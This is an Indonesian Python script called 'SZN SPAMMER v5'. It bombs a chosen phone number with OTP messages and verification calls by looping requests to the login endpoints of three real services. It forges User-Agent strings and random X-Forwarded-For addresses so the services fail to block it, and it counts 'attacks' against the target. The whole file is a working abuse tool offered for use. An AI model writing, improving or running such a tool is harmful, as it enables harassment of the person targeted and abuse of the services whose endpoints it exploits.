import requests
import time
import random

# --- DAFTAR USER-AGENT BIAR DIKIRA HP ASLI ---
UA_LIST = [
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"
]

# --- DAFTAR API KHUSUS JALUR WHATSAPP ---
APIS = [
    {
        "name": "Mapclub WA",
        "url": "https://api.mapclub.com/v1/auth/otp",
        "method": "POST",
        "data": {"phone": "{target_full}", "channel": "whatsapp"} 
    },
    {
        "name": "Jagreward Call", 
        "url": "https://id.jagreward.com/member/verify-mobile/",
        "method": "POST",
        "data": {"method": "call", "countryCode": "62", "phoneNumber": "{target_tanpa_62}"}
    },
    {
        "name": "OYO SMS/WA",
        "url": "https://www.oyorooms.com/api/pwa/generateotp?phone={target_tanpa_62}&country_code=+62",
        "method": "GET",
        "data": None
    }
]

def kirim_wa(target_full, target_tanpa_62, loop, jeda):
    print(f"\n[!] Target Aktif: {target_full}")
    print(f"[!] Jalur: WhatsApp & Call Protocol")
    print("-" * 45)
    
    for i in range(loop):
        # Header Palsu biar ga gampang diblokir WiFi
        headers = {
            "User-Agent": random.choice(UA_LIST),
            "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            "Content-Type": "application/json"
        }
        
        for api in APIS:
            try:
                url_final = api["url"].format(target_full=target_full, target_tanpa_62=target_tanpa_62)
                
                if api["method"] == "POST":
                    payload = api["data"]
                    # Format data target di dalam payload
                    new_payload = {k: v.format(target_full=target_full, target_tanpa_62=target_tanpa_62) if isinstance(v, str) else v for k, v in payload.items()}
                    r = requests.post(url_final, json=new_payload, headers=headers, timeout=10)
                else:
                    r = requests.get(url_final, headers=headers, timeout=10)

                if r.status_code in [200, 201]:
                    print(f"[{i+1}] SUCCESS | {api['name']} | OTP OTW!")
                else:
                    print(f"[{i+1}] FAILED  | {api['name']} | Status: {r.status_code} (Limit)")
                
            except:
                print(f"[{i+1}] ERROR   | {api['name']} | Server Timeout")

            time.sleep(2) # Jeda antar API
            
        print(f"--- Menunggu {jeda} detik ---")
        time.sleep(jeda)

# --- MENU ---
print("="*45)
print("     SZN SPAMMER v5 (WHATSAPP SPECIAL)     ")
print("    Repo: anonymusyogyakarta-coder/tools-szn ")
print("="*45)

inp = input("Nomor Target (Contoh: 0812xxx): ")
if inp.startswith("0"): bersih = inp[1:]
elif inp.startswith("62"): bersih = inp[2:]
else: bersih = inp

target_full = "+62" + bersih
target_tanpa_62 = bersih

total = int(input("Jumlah Serangan: "))
wait = int(input("Jeda Detik (Saran: 30): "))

kirim_wa(target_full, target_tanpa_62, total, wait)
